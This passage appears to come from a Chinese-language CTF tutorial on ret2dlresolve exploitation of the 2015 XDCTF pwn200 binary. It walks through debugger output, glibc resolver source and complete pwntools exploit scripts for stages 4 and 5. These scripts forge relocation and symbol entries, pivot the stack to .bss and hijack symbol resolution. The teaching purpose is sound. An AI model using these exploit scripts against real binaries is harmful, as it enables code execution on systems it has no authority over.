 0x0000000c (INIT)                       0x804834c
 0x0000000d (FINI)                       0x8048654
 0x00000019 (INIT_ARRAY)                 0x8049f04
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f08
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804826c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      107 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   40 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048324
 0x00000011 (REL)                        0x804830c
 0x00000012 (RELSZ)                      24 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482ec
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482d8
 0x00000000 (NULL)                       0x0
</code></pre></div> <p>在 ida 中，我們也可以看到相關的信息</p> <div class=highlight><pre><span></span><code>LOAD:080482D8 ; ELF GNU Symbol Version Table
LOAD:080482D8                 dw 0
LOAD:080482DA                 dw 2                    ; setbuf@@GLIBC_2.0
LOAD:080482DC                 dw 2                    ; read@@GLIBC_2.0
LOAD:080482DE                 dw 0                    ; local  symbol: __gmon_start__
LOAD:080482E0                 dw 2                    ; strlen@@GLIBC_2.0
LOAD:080482E2                 dw 2                    ; __libc_start_main@@GLIBC_2.0
LOAD:080482E4                 dw 2                    ; write@@GLIBC_2.0
LOAD:080482E6                 dw 2                    ; stdin@@GLIBC_2.0
LOAD:080482E8                 dw 2                    ; stdout@@GLIBC_2.0
LOAD:080482EA                 dw 1                    ; global symbol: _IO_stdin_used
</code></pre></div> <p>那我們可以再次運行看一下僞造後 ndx 具體的值</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>stage4.py
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>27649</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>10</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>
ndx_addr:<span class=w> </span>0x80487a8
</code></pre></div> <p>可以發現，ndx_落入了 <code>.eh_frame</code> 節中。</p> <div class=highlight><pre><span></span><code>.eh_frame:080487A8                 dw 442Ch
</code></pre></div> <p>進一步地，ndx 的值爲 0x442C。顯然不知道會索引到哪裏去。</p> <div class=highlight><pre><span></span><code><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
<span class=w>        </span><span class=p>{</span>
<span class=w>            </span><span class=k>const</span><span class=w> </span><span class=n>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=n>vernum</span><span class=w> </span><span class=o>=</span>
<span class=w>                </span><span class=p>(</span><span class=k>const</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>D_PTR</span><span class=p>(</span><span class=n>l</span><span class=p>,</span><span class=w> </span><span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]);</span>
<span class=w>            </span><span class=n>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span><span class=w> </span><span class=n>ndx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>vernum</span><span class=p>[</span><span class=n>ELFW</span><span class=p>(</span><span class=n>R_SYM</span><span class=p>)(</span><span class=n>reloc</span><span class=o>-&gt;</span><span class=n>r_info</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0x7fff</span><span class=p>;</span>
<span class=w>            </span><span class=n>version</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_versions</span><span class=p>[</span><span class=n>ndx</span><span class=p>];</span>
<span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>version</span><span class=o>-&gt;</span><span class=n>hash</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
<span class=w>                </span><span class=n>version</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
</code></pre></div> <p>通過動態調試，我們可以發現 l_versions 的起始地址，並且其中一共有 3 個元素。</p> <div class=highlight><pre><span></span><code>pwndbg&gt; print *((struct link_map *)0xf7f0d940)
$4 = {
  l_addr = 0, 
  l_name = 0xf7f0dc2c &quot;&quot;, 
  l_ld = 0x8049f0c, 
  l_next = 0xf7f0dc30, 
  l_prev = 0x0, 
  l_real = 0xf7f0d940, 
  l_ns = 0, 
  l_libname = 0xf7f0dc20, 
  l_info = {0x0, 0x8049f0c, 0x8049f7c, 0x8049f74, 0x0, 0x8049f4c, 0x8049f54, 0x0, 0x0, 0x0, 0x8049f5c, 0x8049f64, 0x8049f14, 0x8049f1c, 0x0, 0x0, 0x0, 0x8049f94, 0x8049f9c, 0x8049fa4, 0x8049f84, 0x8049f6c, 0x0, 0x8049f8c, 0x0, 0x8049f24, 0x8049f34, 0x8049f2c, 0x8049f3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fb4, 0x8049fac, 0x0 &lt;repeats 13 times&gt;, 0x8049fbc, 0x0 &lt;repeats 25 times&gt;, 0x8049f44}, 
  l_phdr = 0x8048034, 
  l_entry = 134513632, 
  l_phnum = 9, 
  l_ldnum = 0, 
  l_searchlist = {
    r_list = 0xf7edf3e0, 
    r_nlist = 3
  }, 
  l_symbolic_searchlist = {
    r_list = 0xf7f0dc1c, 
    r_nlist = 0
  }, 
  l_loader = 0x0, 
  l_versions = 0xf7edf3f0, 
  l_nversions = 3, 
</code></pre></div> <p>對應的分別爲 </p> <div class=highlight><pre><span></span><code>pwndbg&gt; print *((struct r_found_version[3] *)0xf7edf3f0)
$13 = {{
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x80482be &quot;GLIBC_2.0&quot;, 
    hash = 225011984, 
    hidden = 0, 
    filename = 0x804826d &quot;libc.so.6&quot;
  }}
</code></pre></div> <p>此時，計算得到的 version 地址爲 0xf7f236b0，顯然不在映射的內存區域。</p> <div class=highlight><pre><span></span><code>pwndbg&gt; print /x 0xf7edf3f0+0x442C*16
$16 = 0xf7f236b0
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x8049000  0x804a000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x804a000  0x804b000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
0xf7ce8000 0xf7ebd000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7ebd000 0xf7ebe000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ebe000 0xf7ec0000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec0000 0xf7ec1000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec1000 0xf7ec4000 rw-p     3000 0      
0xf7edf000 0xf7ee1000 rw-p     2000 0      
0xf7ee1000 0xf7ee4000 r--p     3000 0      [vvar]
0xf7ee4000 0xf7ee6000 r-xp     2000 0      [vdso]
0xf7ee6000 0xf7f0c000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
0xf7f0c000 0xf7f0d000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
0xf7f0d000 0xf7f0e000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
0xffa4b000 0xffa6d000 rw-p    22000 0      [stack]
</code></pre></div> <p>而在動態解析符號地址的過程中，如果 version 爲 NULL 的話，也會正常解析符號。</p> <p>與此同，根據上面的調試信息，可以知道 l_versions 的前兩個元素中的 hash 值都爲 0，因此如果我們使得 ndx 爲 0 或者 1 時，就可以滿足要求，我們來在 080487A8 下方找一個合適的值。可以發現 0x080487C2 處的內容爲0。</p> <p>那自然的，我們就可以調用目標函數。</p> <p>這裏，我們可以通過調整 base_stage 來達到相應的目的。</p> <ul> <li>首先 0x080487C2 與 0x080487A8 之間差了 0x080487C2-0x080487A8)/2 個 version 記錄。</li> <li>那麼，這也就說明原先的符號表偏移少了對應的個數。</li> <li>因此，我們只需要將 base_stage 增加 (0x080487C2-0x080487A8)/2*0x10，即可達到對應的目的。</li> </ul> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0x080487C2</span><span class=o>-</span><span class=mh>0x080487A8</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=o>*</span><span class=mh>0x10</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>

<span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rel.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

<span class=c1># make a fake write symbol at base_stage + 32 + align</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>32</span>
<span class=n>align</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=p>((</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span>
                <span class=p>)</span>  <span class=c1># since the size of Elf32_Symbol is 0x10</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=n>align</span>
<span class=n>index_dynsym</span> <span class=o>=</span> <span class=p>(</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>/</span> <span class=mh>0x10</span>  <span class=c1># calculate the dynsym index of write</span>
<span class=n>fake_write_sym</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=mh>0x4c</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>])</span>

<span class=c1># make fake write relocation at base_stage+24</span>
<span class=n>index_offset</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>24</span> <span class=o>-</span> <span class=n>rel_plt</span>
<span class=n>write_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
<span class=n>r_info</span> <span class=o>=</span> <span class=p>(</span><span class=n>index_dynsym</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x7</span> <span class=c1># calculate the r_info according to the index of write</span>
<span class=n>fake_write_reloc</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>write_got</span><span class=p>,</span> <span class=n>r_info</span><span class=p>])</span>

<span class=n>gnu_version_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.gnu.version&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=nb>print</span><span class=p>(</span><span class=s2>&quot;ndx_addr: </span><span class=si>%s</span><span class=s2>&quot;</span> <span class=o>%</span> <span class=nb>hex</span><span class=p>(</span><span class=n>gnu_version_addr</span><span class=o>+</span><span class=n>index_dynsym</span><span class=o>*</span><span class=mi>2</span><span class=p>))</span>

<span class=c1># construct rop chain</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>index_offset</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span> <span class=c1># fake ret addr of write</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>base_stage</span> <span class=o>+</span> <span class=mi>80</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_reloc</span><span class=p>)</span>  <span class=c1># fake write reloc</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>align</span><span class=p>)</span>  <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_sym</span><span class=p>)</span>  <span class=c1># fake write symbol</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>最終如下</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>stage4.py
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>27967</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>10</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./main_partial_relro_32&#39;</span>
ndx_addr:<span class=w> </span>0x80487c2
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
/bin/sh<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Got<span class=w> </span>EOF<span class=w> </span><span class=k>while</span><span class=w> </span>reading<span class=w> </span><span class=k>in</span><span class=w> </span>interactive
</code></pre></div> <h5 id=stage-5>stage 5<a class=headerlink href=#stage-5 title="Permanent link">&para;</a></h5> <p>這一階段，我們將在階段 4 的基礎上，進一步僞造 write 符號的 st_name 指向我們自己構造的字符串。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span> <span class=o>+</span> <span class=p>(</span><span class=mh>0x080487C2</span><span class=o>-</span><span class=mh>0x080487A8</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span><span class=o>*</span><span class=mh>0x10</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>

<span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rel.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

<span class=c1># make a fake write symbol at base_stage + 32 + align</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>32</span>
<span class=n>align</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=p>((</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span>  <span class=c1># since the size of Elf32_Symbol is 0x10</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=n>align</span>
<span class=n>index_dynsym</span> <span class=o>=</span> <span class=p>(</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>/</span> <span class=mh>0x10</span>  <span class=c1># calculate the dynsym index of write</span>
<span class=n>st_name</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=n>dynstr</span>         <span class=c1># plus 10 since the size of Elf32_Sym is 16.</span>
<span class=n>fake_write_sym</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>st_name</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>])</span>

<span class=c1># make fake write relocation at base_stage+24</span>
<span class=n>index_offset</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>24</span> <span class=o>-</span> <span class=n>rel_plt</span>
<span class=n>write_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
<span class=n>r_info</span> <span class=o>=</span> <span class=p>(</span><span class=n>index_dynsym</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x7</span> <span class=c1># calculate the r_info according to the index of write</span>
<span class=n>fake_write_reloc</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>write_got</span><span class=p>,</span> <span class=n>r_info</span><span class=p>])</span>

<span class=c1># construct rop chain</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>index_offset</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span> <span class=c1># fake ret addr of write</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>base_stage</span> <span class=o>+</span> <span class=mi>80</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_reloc</span><span class=p>)</span>  <span class=c1># fake write reloc</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>align</span><span class=p>)</span>  <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_sym</span><span class=p>)</span>  <span class=c1># fake write symbol</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;write</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># there must be a \x00 to mark the end of string</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>效果如下</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>stage5.py
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>i386-32-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
